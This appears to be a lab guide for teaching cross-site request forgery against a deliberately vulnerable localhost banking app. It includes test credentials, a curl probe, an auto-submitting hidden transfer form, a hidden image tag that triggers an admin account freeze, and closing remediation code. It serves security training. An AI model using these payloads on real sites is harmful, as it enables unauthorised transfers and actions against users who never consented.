Lab 04 — CSRF Lab Guide ← App
Educational Lab: Contains intentional CSRF vulnerabilities. Use only in isolated training environments.
Lab Overview

Application: SecureBank Online Banking (.NET 8 MVC)

URL: http://localhost:5000

Test Accounts:

  • user@securebank.com / User123!
  • alice@securebank.com / Alice123!
  • admin@securebank.com / Admin123!

Vulnerabilities:

  • CSRF-001: Money transfer without anti-forgery token
  • CSRF-002: Bill payment without CSRF protection
  • CSRF-003: Profile update without CSRF protection
  • CSRF-004: Admin actions (freeze account) without CSRF protection
Step 1: Reconnaissance

Identify state-changing endpoints (POST/PUT/DELETE) and check for anti-forgery tokens:

  • Open DevTools → Network tab → Submit each form
  • Look for __RequestVerificationToken in POST body → if absent = VULNERABLE
  • Check response cookies for SameSite attribute
curl -v -X POST http://localhost:5000/Transfer/Send \
  -d "FromAccountNumber=USER001&ToAccountNumber=ADMIN001&Amount=100"
# No CSRF token required = VULNERABLE

Step 3: Exploitation
CSRF-001: Steal Money via Transfer
  1. Login to banking app as victim user (user@securebank.com)
  2. Open csrf-demo.html in the same browser
  3. The page auto-submits a transfer of $100 to ADMIN001
  4. Check Transfer History — the transfer completed!
<!-- Minimal CSRF attack page -->
<form action="http://localhost:5000/Transfer/Send" method="POST">
  <input type="hidden" name="FromAccountNumber" value="USER001">
  <input type="hidden" name="ToAccountNumber" value="ADMIN001">
  <input type="hidden" name="Amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
CSRF-004: Admin Action via Image Tag
<!-- This image tag triggers a freeze action when admin views the page -->
<img src="http://localhost:5000/Admin/FreezeAccount?accountId=USER001"
     width="0" height="0" onerror="this.remove()">
Step 4: Remediation
1. Add ValidateAntiForgeryToken to every POST action
// Add this attribute to ALL state-changing actions:
[HttpPost]
[ValidateAntiForgeryToken]  // ← ADD THIS
public async Task<IActionResult> Send(TransferViewModel model)
2. Add AntiForgeryToken to every form
// In every Razor view form, add:
<form asp-action="Send" method="post">
    @Html.AntiForgeryToken()   <!-- ← ADD THIS -->
    ...
</form>
3. Configure SameSite=Strict cookies
builder.Services.ConfigureApplicationCookie(options => {
    options.Cookie.SameSite = SameSiteMode.Strict;  // Blocks cross-site requests
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});
